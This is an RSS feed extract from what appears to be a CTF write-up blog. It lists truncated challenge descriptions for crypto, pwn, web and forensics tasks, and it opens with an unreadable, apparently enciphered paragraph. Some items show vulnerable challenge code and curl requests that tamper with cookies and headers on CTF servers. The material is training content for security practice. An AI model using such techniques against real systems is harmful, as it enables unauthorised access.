alp gwcsepul gtavaf, nlv prgpbpsu mb h jcpbyvdlq, ipltga rv glniypfa we ekl 16xs nsjhlcb. px td o lccjdstslpahzn fptspf xstlxzi te iosj ezv sc xcns ttsoic lzlvrmhaw ez sjqijsa xsp rwhr. tq vxspf sciov, alp wsphvcv pr ess rwxpqlvp nwlvvc dyi dswbhvo ef htqtafvyw hqzfbpg, ezutewwm zcep xzmyr o scio ry tscoos rd woi pyqnmgelvr vpm . qbctnl xsp akbflowllmspwt nlwlpcg, lccjdstslpahzn fptspfo oip qvx dfgysgelipp ec bfvbxlrnj ojocjvpw, ld akfv ekhr zys hskehy my eva dclluxpih yoe mh yiacsoseehk fj l gebxwh sieesn we ekl iynfudktru.</description></item><item><title>Close Enough</title><link>https://7rocky.github.io/en/ctf/other/seetf/close-enough/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/seetf/close-enough/</guid><description>We are told that some RSA implementation uses a prime number and the next prime number. We are also given the ciphertext:
4881495507745813082308282986718149515999022572229780274224400469722585868147852608187509420010185039618775981404400401792885121498931245511345550975906095728230775307758109150488484338848321930294974674504775451613333664851564381516108124030753196722125755223318280818682830523620259537479611172718588812979116127220273108594966911232629219195957347063537672749158765130948724281974252007489981278474243333628204092770981850816536671234821284093955702677837464584916991535090769911997642606614464990834915992346639919961494157328623213393722370119570740146804362651976343633725091450303521253550650219753876236656017 We got the source code as well:
from Crypto.Util.number import getPrime, bytes_to_long from Crypto.PublicKey import RSA from secret import flag, getNextPrime p = getPrime(1024) q = getNextPrime(p) n = p * q e = 65537 key = RSA.construct((n, e)).export_key().decode() with open("key", "w") as f: f.write(key) m = bytes_to_long(flag.</description></item><item><title>clutter-overflow</title><link>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/clutter-overflow/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/clutter-overflow/</guid><description>We are given a 64-bit binary called chall:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) We also have the C source code. Basically, what the program does is call function gets and after that compare a local variable (code) with the value of a global variable (GOAL):
#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #define SIZE 0x100 #define GOAL 0xdeadbeef const char* HEADER = "</description></item><item><title>Colliding Heritage</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/colliding-heritage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/colliding-heritage/</guid><description>We are provided with the server source code in Python:
#!/usr/bin/env python3 import signal from secrets import randbelow from hashlib import md5 from Crypto.Util.number import isPrime, getPrime, long_to_bytes, bytes_to_long FLAG = "HTB{???????????????????????????}" class MD5chnorr: def __init__(self): # while True: # self.q = getPrime(128) # self.p = 2*self.q + 1 # if isPrime(self.p): # break self.p = 0x16dd987483c08aefa88f28147702e51eb self.q = (self.p - 1) // 2 self.g = 3 self.x = randbelow(self.q) self.</description></item><item><title>Colliding Heritage</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/colliding-heritage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/colliding-heritage/</guid><description>We are provided with the server source code in Python:
#!/usr/bin/env python3 import signal from secrets import randbelow from hashlib import md5 from Crypto.Util.number import isPrime, getPrime, long_to_bytes, bytes_to_long FLAG = "HTB{???????????????????????????}" class MD5chnorr: def __init__(self): # while True: # self.q = getPrime(128) # self.p = 2*self.q + 1 # if isPrime(self.p): # break self.p = 0x16dd987483c08aefa88f28147702e51eb self.q = (self.p - 1) // 2 self.g = 3 self.x = randbelow(self.q) self.</description></item><item><title>Come on feel the nonce</title><link>https://7rocky.github.io/en/ctf/other/ctfzone/come-on-feel-the-nonce/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/ctfzone/come-on-feel-the-nonce/</guid><description>We are given source code in Go:
package main import ( "crypto/elliptic" cryptorand "crypto/rand" "crypto/sha256" "encoding/base64" "fmt" "log" "math" "math/big" "math/rand" "os" ) func randInt64() int64 { n, err := cryptorand.Int(cryptorand.Reader, big.NewInt(math.MaxInt64)) if err != nil { panic(err) } return n.Int64() } func encrypt(data, priv []byte) string { res := make([]byte, 0) st := sha256.Sum256(priv) for i, b := range data { res = append(res, b^st[i]) } return base64.StdEncoding.EncodeToString(res) } func decrypt(enc string, priv []byte) string { res := make([]byte, 0) data, _ := base64.</description></item><item><title>Composition</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/composition/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/composition/</guid><description>We are given the source code of the server in Python:
from Crypto.Util.number import isPrime, getPrime, GCD, long_to_bytes, bytes_to_long from Crypto.Cipher import AES from Crypto.Util.Padding import pad from secret import flag from ecc import EllipticCurve from hashlib import md5 import os import random print("Welcome to the ECRSA test center. Your encrypted data will be sent soon.") print("Please check the logs for the parameters.") legendre = lambda x,p: pow(x,(p-1)//2,p) def next_prime(num): if num % 2 == 0: num += 1 else: num += 2 while not isPrime(num): num += 2 return num def getrandpoint(ec,p,q): num = random.</description></item><item><title>Compressor</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/compressor/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/compressor/</guid><description>For this challenge we are only given a remote instance to connect to:
$ nc 157.245.33.77 31001 [*] Directory to work in: 9wIylX4fBakMNG8u6YfY37k3k1geVXHv Component List: +===============+ | | | 1. Head 🤖 | | 2. Torso 🦴 | | 3. Hands 💪 | | 4. Legs 🦵 | | | +===============+ [*] Choose component: We can choose the first one, for example:
[*] Choose component: 1 [*] Sub-directory to work in: 9wIylX4fBakMNG8u6YfY37k3k1geVXHv/Head Actions: 1.</description></item><item><title>Confidentiality</title><link>https://7rocky.github.io/en/ctf/htb-challenges/blockchain/confidentiality/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/blockchain/confidentiality/</guid><description>We are given a Solidity file called AccessToken.sol:
// SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.19; import {ERC721} from "./lib/ERC721.sol"; import {Owned} from "./lib/Owned.sol"; contract AccessToken is ERC721, Owned { uint256 public currentSupply; bytes[] public usedSignatures; bytes32 public constant approvalHash = 0x4ed1c9f7e3813196653ad7c62857a519087860f86aff4bc7766c8af8756a72ba; constructor(address _owner) Owned(_owner) ERC721("AccessToken", "ACT") {} function safeMint(address to) public onlyOwner returns (uint256) { return _safeMintInternal(to); } function safeMintWithSignature(bytes memory signature, address to) external returns (uint256) { require(_verifySignature(signature), "Not approved"); require(!</description></item><item><title>Control Room</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/control-room/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/control-room/</guid><description>We are given a 64-bit binary called control_room:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' Setup environment We are also provided with the remote Glibc library:
$ ./libc.so.6 GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35. Copyright (C) 2022 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</description></item><item><title>Control Room</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/control-room/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/control-room/</guid><description>We are given a 64-bit binary called control_room:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' Setup environment We are also provided with the remote Glibc library:
$ ./libc.so.6 GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35. Copyright (C) 2022 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</description></item><item><title>Converging Visions</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/converging-visions/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/converging-visions/</guid><description>We are provided with the server source code in Python:
from secret import FLAG, p, a, b from random import randint from utils import EllipticCurve class PRNG: def __init__(self, p, mul1, mul2): self.mod = p * 6089788258325039501929073418355467714844813056959443481824909430411674443639248386564763122373451773381582660411059922334086996696436657009055324008041039 self.exp = 2 self.mul1 = mul1 self.mul2 = mul2 self.inc = int.from_bytes(b'Coordinates lost in space', 'big') self.seed = randint(2, self.mod - 1) def rotate(self): self.seed = (self.mul1 * pow(self.seed, 3) + self.mul2 * self.</description></item><item><title>Converging Visions</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/converging-visions/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/converging-visions/</guid><description>We are provided with the server source code in Python:
from secret import FLAG, p, a, b from sage.all_cmdline import * class PRNG: def __init__(self, p, mul1, mul2): self.mod = p * 6089788258325039501929073418355467714844813056959443481824909430411674443639248386564763122373451773381582660411059922334086996696436657009055324008041039 self.exp = 2 self.mul1 = mul1 self.mul2 = mul2 self.inc = int.from_bytes(b'Coordinates lost in space', 'big') self.seed = randint(2, self.mod - 1) def rotate(self): self.seed = (self.mul1 * pow(self.seed, 3) + self.mul2 * self.seed + self.inc) % self.</description></item><item><title>Cookies</title><link>https://7rocky.github.io/en/ctf/picoctf/web-exploitation/cookies/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/web-exploitation/cookies/</guid><description>We are given a website that asks for a cookie:
Looking at the developer tools, we can see that we have a cookie name=-1. If we send snickerdoodle as the placeholder suggests, the cookie will change to name=0:
Let&amp;rsquo;s modify the value of the cookie using curl and show only the message:
$ curl mercury.picoctf.net:27177/check -sH 'Cookie: name=0' | grep -oE '&amp;lt;b&amp;gt;.*?&amp;lt;/b&amp;gt;' &amp;lt;b&amp;gt;I love snickerdoodle cookies!&amp;lt;/b&amp;gt; Now let&amp;rsquo;s use a loop in Bash to see if something change if we use another value as cookie:</description></item><item><title>cos1</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/cos1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/cos1/</guid><description>We are asked to compute the cosine of 42 radians, rounded to 6 decimal places. This is simple:
$ python3 -q &amp;gt;&amp;gt;&amp;gt; import math &amp;gt;&amp;gt;&amp;gt; math.cos(42) -0.39998531498835127 &amp;gt;&amp;gt;&amp;gt; round(math.cos(42), 6) -0.399985 &amp;gt;&amp;gt;&amp;gt; 'ictf{' + str(round(math.cos(42), 6)) + '}' 'ictf{-0.399985}'</description></item><item><title>cos2</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/cos2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/cos2/</guid><description>We are asked to compute the cosine of 42 radians, rounded to 100 decimal places. For this, we can use Wolfram Alpha:
And the flag is:
ictf{-0.3999853149883512939547073371772020283804228791424190606167446601513424425835587794388549191368621883}</description></item><item><title>CRSid</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/crsid/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/crsid/</guid><description>We have a 64-bit binary called crsid:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' If we execute it, we need to enter a CRSid and then we have this menu:
$ ./crsid ██████╗██████╗ ███████╗██╗██████╗ ██╔════╝██╔══██╗██╔════╝██║██╔══██╗ ██║ ██████╔╝███████╗██║██║ ██║ ██║ ██╔══██╗╚════██║██║██║ ██║ ╚██████╗██║ ██║███████║██║██████╔╝ ╚═════╝╚═╝ ╚═╝╚══════╝╚═╝╚═════╝ [i] Enter your CRSid: asdf ========================= [1] Create username [2] Delete username [3] Edit username [4] Show username [5] Change your CRSid [6] Exit ========================= [#] Reverse engineering It is a typical heap challenge.</description></item><item><title>CryptoConundrum</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/cryptoconundrum/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/cryptoconundrum/</guid><description>We are given the source code in Python to encrypt a message:
from os import urandom from Crypto.Cipher import AES from secret import MESSAGE assert all([x.isupper() for x in MESSAGE]) assert MESSAGE.startswith('A') class Cipher: def __init__(self): self.salt = urandom(14) key = urandom(16) self.cipher = AES.new(key, AES.MODE_ECB) def encrypt(self, message): return [ self.cipher.encrypt(message[i:i + 2].encode() + self.salt) for i in range(len(message) - 1) ] def main(): cipher = Cipher() encrypted = cipher.</description></item><item><title>cryptoGRAPHy (1, 2, 3)</title><link>https://7rocky.github.io/en/ctf/other/sekai-ctf/cryptography-1-2-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/sekai-ctf/cryptography-1-2-3/</guid><description>This series of challenges has a background on graph theory combined with cryptography. The author implemented a Python library using networkx to handle graphs and cryptographyc functions such as AES cipher, HMAC or SHA256 hash.
These challenges were a bit polemic due to the fact that players needed to read, analyze and understand the implemented library for the Graph Encryption Scheme and after that implement a solution to the corresponding challenge.</description></item><item><title>Cult Meeting</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/cult-meeting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/cult-meeting/</guid><description>We are given a binary called meeting:
$ file meeting meeting: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=72d8b06e4ca750d5c24395d3349c3121b9b95283, for GNU/Linux 3.2.0, not stripped Reverse engineering Using Ghidra, we can read the decompiled source code in C. This is the main function:
int main() { int ret; char *pointer; char input_data[64]; setvbuf(stdout, NULL, 2, 0); puts("\x1b[3mYou knock on the door and a panel slides back\x1b[0m"</description></item><item><title>CurlAsAService</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/curlasaservice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/curlasaservice/</guid><description>We are provided with this webpage, which allows us to execute curl:
Source code analysis We also have the PHP source code. This is index.php:
&amp;lt;?php date_default_timezone_set('UTC'); spl_autoload_register(function ($name){ if (preg_match('/Controller$/', $name)) { $name = "controllers/${name}"; } else if (preg_match('/Model$/', $name)) { $name = "models/${name}"; } include_once "${name}.php"; }); $router = new Router(); $router-&amp;gt;new('GET', '/', 'CurlController@index'); $router-&amp;gt;new('POST', '/api/curl', 'CurlController@execute' ); $response = $router-&amp;gt;match(); die($response); Here we only see two routes. The one that is most interesting is handled by CurlController.</description></item><item><title>Curse Breaker</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/curse-breaker/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/curse-breaker/</guid><description>We are given a binary called breaker:
$ file breaker breaker: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=203d702c3e6cc789e148886f986713f7cf21e2c2, for GNU/Linux 3.2.0, not stripped Reverse engineering Using Ghidra, we can read the decompiled source code in C. This is the main function:
int main() { size_t newline_index; long i5; char magic_word[50]; uint i; magic_word._0_8_ = 0; magic_word._8_8_ = 0; magic_word._16_8_ = 0; magic_word._24_8_ = 0; magic_word.</description></item><item><title>Curse Breaker</title><link>https://7rocky.github.io/en/ctf/other/htb-unictf/curse-breaker/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-unictf/curse-breaker/</guid><description>We are given a binary called breaker:
$ file breaker breaker: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=276c71525dd765da538440a4615fa5b717e331ad, for GNU/Linux 3.2.0, not stripped Reverse engineering Using Ghidra, we can read the decompiled source code in C. This is the main function:
int main() { size_t newline_index; long i5; char magic_word[50]; uint i; magic_word._0_8_ = 0; magic_word._8_8_ = 0; magic_word._16_8_ = 0; magic_word._24_8_ = 0; magic_word.</description></item><item><title>Cursed Secret Party</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/cursed-secret-party/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/cursed-secret-party/</guid><description>We are given this website:
Static code analysis We are provided with the JavaScript source code of the web application, built in Node.js with Express JS. This is routes/index.js:
const express = require('express'); const router = express.Router({ caseSensitive: true }); const AuthMiddleware = require('../middleware/AuthMiddleware'); const bot = require('../bot'); let db; const response = data =&amp;gt; ({ message: data }); router.get('/', (req, res) =&amp;gt; { return res.render('index.html'); }); router.post('/api/submit', (req, res) =&amp;gt; { const { halloween_name, email, costume_type, trick_or_treat } = req.</description></item><item><title>Cursed Secret Party</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/cursed-secret-party/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/cursed-secret-party/</guid><description>We are given this website:
Static code analysis We are provided with the JavaScript source code of the web application, built in Node.js with Express JS. This is routes/index.js:
const express = require('express'); const router = express.Router({ caseSensitive: true }); const AuthMiddleware = require('../middleware/AuthMiddleware'); const bot = require('../bot'); let db; const response = data =&amp;gt; ({ message: data }); router.get('/', (req, res) =&amp;gt; { return res.render('index.html'); }); router.post('/api/submit', (req, res) =&amp;gt; { const { halloween_name, email, costume_type, trick_or_treat } = req.</description></item><item><title>CVE-XXXX-XXXX</title><link>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/cve-xxxx-xxxx/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/cve-xxxx-xxxx/</guid><description>We have this challenge statement:
The CVE we&amp;rsquo;re looking for is the first recorded remote code execution (RCE) vulnerability in 2021 in the Windows Print Spooler Service, which is available across desktop and server versions of Windows operating systems. The service is used to manage printers and print servers.
We are told to search a CVE identifier for the first RCE vulnerability in Windows Print Spooler Service in 2021. This vulnerability is known as PrintNightmare, and it corresponds to several CVE.</description></item><item><title>Da Vinci</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/da-vinci/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/da-vinci/</guid><description>We are given three JPEG images:
monalisa.jpg: Plans.jpg: Thepassword_is_the_small_name_of_the_actor_named_Hanks.jpg: $ file monalisa.jpg monalisa.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, comment: "CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 92", comment: "Optimized by JPEGmini 3.9.20.0L Internal 0x8c97c7da", baseline, precision 8, 1280x1936, components 3 $ file Plans.jpg Plans.jpg: JPEG image data, JFIF standard 1.02, aspect ratio, density 100x100, segment length 16, baseline, precision 8, 800x600, components 3 $ file Thepassword_is_the_small_name_of_the_actor_named_Hanks.</description></item><item><title>Deadly Arthropod</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/deadly-arthropod/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/deadly-arthropod/</guid><description>We are given a PCAP file called deadly_arthropod.pcap with some USB events:
Identifying the device There is an event that shows that the USB device is a keyboard (actually, Razer BlackWidow Ultimate 2013):
Therefore, we will need to analyze key strokes, like in Logger. Hardware devices use a protocol known as Human Interface Device (HID). More information can be found at Wikipedia. In fact, there is a documentation manual attached: ww.</description></item><item><title>DHCPPP</title><link>https://7rocky.github.io/en/ctf/other/plaid-ctf/dhcppp/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/plaid-ctf/dhcppp/</guid><description>We are given the Python source code of the server that has the flag:
import time, zlib import secrets import hashlib import requests from Crypto.Cipher import ChaCha20_Poly1305 import dns.resolver CHACHA_KEY = secrets.token_bytes(32) TIMEOUT = 1e-1 def encrypt_msg(msg, nonce): # In case our RNG nonce is repeated, we also hash # the message in. This means the worst-case scenario # is that our nonce reflects a hash of the message # but saves the chance of a nonce being reused across # different messages nonce = sha256(msg[:32] + nonce[:32])[:12] cipher = ChaCha20_Poly1305.</description></item><item><title>Didactic Octo Paddles</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/didactic-octo-paddles/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/didactic-octo-paddles/</guid><description>We are given a website like this:
We also have the source code in Node.js.
Source code analysis The web application is built with Express JS. After reading some files, one that stands out is middlewares/AdminMiddleware.js:
const jwt = require("jsonwebtoken"); const { tokenKey } = require("../utils/authorization"); const db = require("../utils/database"); const AdminMiddleware = async (req, res, next) =&amp;gt; { try { const sessionCookie = req.cookies.session; if (!sessionCookie) { return res.redirect("/login"); } const decoded = jwt.</description></item><item><title>Didactic Octo Paddles</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/didactic-octo-paddles/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/didactic-octo-paddles/</guid><description>We are given a website like this:
We also have the source code in Node.js.
Source code analysis The web application is built with Express JS. After reading some files, one that stands out is middlewares/AdminMiddleware.js:
const jwt = require("jsonwebtoken"); const { tokenKey } = require("../utils/authorization"); const db = require("../utils/database"); const AdminMiddleware = async (req, res, next) =&amp;gt; { try { const sessionCookie = req.cookies.session; if (!sessionCookie) { return res.redirect("/login"); } const decoded = jwt.</description></item><item><title>Don't Bump Your Head(er)</title><link>https://7rocky.github.io/en/ctf/ctflearn/web/dont-bump-your-header/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/web/dont-bump-your-header/</guid><description>We are given a URL to interact with. Let&amp;rsquo;s use curl:
$ curl 165.227.106.113/header.php Sorry, it seems as if your user agent is not correct, in order to access this website. The one you supplied is: curl/7.81.0 &amp;lt;!-- Sup3rS3cr3tAg3nt --&amp;gt; It seems that we need to use a specific user agent (maybe Sup3rS3cr3tAg3nt works):
$ curl 165.227.106.113/header.php -H 'User-Agent: Sup3rS3cr3tAg3nt' Sorry, it seems as if you did not just come from the site, "</description></item><item><title>Don't Overreact</title><link>https://7rocky.github.io/en/ctf/htb-challenges/mobile/dont-overreact/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/mobile/dont-overreact/</guid><description>We are given an APK file (app-release.apk).
APK extraction From the name of the challenge, we might think of React Native for mobile development. For the moment, let&amp;rsquo;s extract the APK file contents with apktool:
$ apktool d app-release.apk I: Using Apktool 2.6.1 on app-release.apk I: Loading resource table... I: Decoding AndroidManifest.xml with resources... I: Loading resource table from file: ~/.local/share/apktool/framework/1.apk I: Regular manifest package... I: Decoding file-resources... I: Decoding values */* XMLs.</description></item><item><title>Down the Rabinhole</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/down-the-rabinhole/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/down-the-rabinhole/</guid><description>We are given a Python code to encrypt the flag, and the corresponding out.txt file:
from Crypto.Util.number import getPrime, isPrime, bytes_to_long from Crypto.Util.Padding import pad import os FLAG = b"HTB{--REDACTED--}" def getPrimes(coefficient): while True: a = getPrime(512) p = 3 * coefficient * a + 2 if isPrime(p): break while True: b = getPrime(512) q = 3 * coefficient * b + 2 if isPrime(q): break return p, q def encrypt(message, coefficient): p, q = getPrimes(coefficient) n = p * q padded_message = bytes_to_long(pad(message, 256)) message = bytes_to_long(message) c1 = (message * (message + coefficient)) % n c2 = (padded_message * (padded_message + coefficient)) % n return (n, c1, c2) def main(): coefficient = getPrime(128) out = "</description></item><item><title>Downgrade</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/downgrade/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/downgrade/</guid><description>We are given a lot of Windows Event logs (.evtx files):
$ tree Logs Logs ├── Application.evtx ├── HardwareEvents.evtx ├── Internet Explorer.evtx ├── Key Management Service.evtx ├── Microsoft-Windows-AppModel-Runtime%4Admin.evtx ├── Microsoft-Windows-AppReadiness%4Admin.evtx ├── Microsoft-Windows-AppReadiness%4Operational.evtx ├── Microsoft-Windows-AppXDeployment%4Operational.evtx ├── Microsoft-Windows-AppXDeploymentServer%4Operational.evtx ├── Microsoft-Windows-AppXDeploymentServer%4Restricted.evtx ├── Microsoft-Windows-ApplicationResourceManagementSystem%4Operational.evtx ├── Microsoft-Windows-Bits-Client%4Operational.evtx ├── Microsoft-Windows-CodeIntegrity%4Operational.evtx ├── Microsoft-Windows-Compat-Appraiser%4Operational.evtx ├── Microsoft-Windows-CoreApplication%4Operational.evtx ├── Microsoft-Windows-Crypto-DPAPI%4BackUpKeySvc.evtx ├── Microsoft-Windows-Crypto-DPAPI%4Operational.evtx ├── Microsoft-Windows-DSC%4Admin.evtx ├── Microsoft-Windows-DSC%4Operational.evtx ├── Microsoft-Windows-DataIntegrityScan%4Admin.evtx ├── Microsoft-Windows-DataIntegrityScan%4CrashRecovery.evtx ├── Microsoft-Windows-DeviceSetupManager%4Admin.evtx ├── Microsoft-Windows-DeviceSetupManager%4Operational.evtx ├── Microsoft-Windows-Dhcp-Client%4Admin.evtx ├── Microsoft-Windows-Dhcpv6-Client%4Admin.evtx ├── Microsoft-Windows-Diagnosis-DPS%4Operational.evtx ├── Microsoft-Windows-Forwarding%4Operational.</description></item><item><title>Downgrade</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/downgrade/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/downgrade/</guid><description>We are given a lot of Windows Event logs (.evtx files):
$ tree Logs Logs ├── Application.evtx ├── HardwareEvents.evtx ├── Internet Explorer.evtx ├── Key Management Service.evtx ├── Microsoft-Windows-AppModel-Runtime%4Admin.evtx ├── Microsoft-Windows-AppReadiness%4Admin.evtx ├── Microsoft-Windows-AppReadiness%4Operational.evtx ├── Microsoft-Windows-AppXDeployment%4Operational.evtx ├── Microsoft-Windows-AppXDeploymentServer%4Operational.evtx ├── Microsoft-Windows-AppXDeploymentServer%4Restricted.evtx ├── Microsoft-Windows-ApplicationResourceManagementSystem%4Operational.evtx ├── Microsoft-Windows-Bits-Client%4Operational.evtx ├── Microsoft-Windows-CodeIntegrity%4Operational.evtx ├── Microsoft-Windows-Compat-Appraiser%4Operational.evtx ├── Microsoft-Windows-CoreApplication%4Operational.evtx ├── Microsoft-Windows-Crypto-DPAPI%4BackUpKeySvc.evtx ├── Microsoft-Windows-Crypto-DPAPI%4Operational.evtx ├── Microsoft-Windows-DSC%4Admin.evtx ├── Microsoft-Windows-DSC%4Operational.evtx ├── Microsoft-Windows-DataIntegrityScan%4Admin.evtx ├── Microsoft-Windows-DataIntegrityScan%4CrashRecovery.evtx ├── Microsoft-Windows-DeviceSetupManager%4Admin.evtx ├── Microsoft-Windows-DeviceSetupManager%4Operational.evtx ├── Microsoft-Windows-Dhcp-Client%4Admin.evtx ├── Microsoft-Windows-Dhcpv6-Client%4Admin.evtx ├── Microsoft-Windows-Diagnosis-DPS%4Operational.evtx ├── Microsoft-Windows-Forwarding%4Operational.</description></item><item><title>Dragon Army</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/dragon-army/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/dragon-army/</guid><description>We are given a 64-bit binary called da:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Moreover, we have this Glibc version:
